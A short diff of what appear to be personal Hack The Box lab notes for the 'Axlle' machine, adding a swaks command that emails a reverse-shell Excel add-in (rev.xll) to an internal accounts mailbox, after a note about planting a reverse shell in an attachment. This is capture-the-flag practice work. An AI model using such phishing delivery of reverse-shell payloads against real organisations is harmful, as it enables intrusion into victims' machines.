@@ -206,4 +206,4 @@ PORT   STATE SERVICE
 
 swaks from to accounts maybe can proc some revshell in data or attacj file
 
-
+swaks --to accounts@axlle.htb --from accounts@axlle.htb --attach @/home/parrot/Desktop/HackingLab/HackTheBox/Machines/Axlle/rev.xll --header "Subject: Test Email" --body "Testing email to $user"
